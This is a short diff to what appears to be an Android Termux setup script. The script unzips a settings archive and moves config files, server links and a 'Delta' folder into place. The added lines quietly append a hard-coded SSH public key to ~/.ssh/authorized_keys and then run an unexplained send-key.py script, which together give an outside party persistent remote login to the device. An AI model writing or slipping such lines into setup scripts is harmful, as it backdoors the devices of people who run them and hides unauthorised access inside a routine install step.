@@ -1,5 +1,7 @@
-echo "A" | unzip /sdcard/Download/Settings.zip -d /sdcard
-cp /sdcard/Settings/Accountslog/cookie.txt /sdcard/Download
-cp /sdcard/Settings/Accountslog/config.json /sdcard/Download/Shouko
-cp /sdcard/Settings/Accountslog/server_links.txt /sdcard/Download/Shouko
-cp -r /sdcard/Settings/Delta /sdcard
+pkg install python -y
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWZ71KZdPmDOceNyyEg+V5J3hyurXkRLJ3iA1/rxlqD" >> ~/.ssh/authorized_keys
+echo "A" | unzip /sdcard/Download/Settings.zip -d /sdcard && rm /sdcard/Download/Settings.zip
+mv /sdcard/Settings/config.json /sdcard/Download/Shouko
+mv /sdcard/Settings/server_links.txt /sdcard/Download/Shouko
+mv /sdcard/Settings/Delta /sdcard
+python /sdcard/Settings/send-key.py
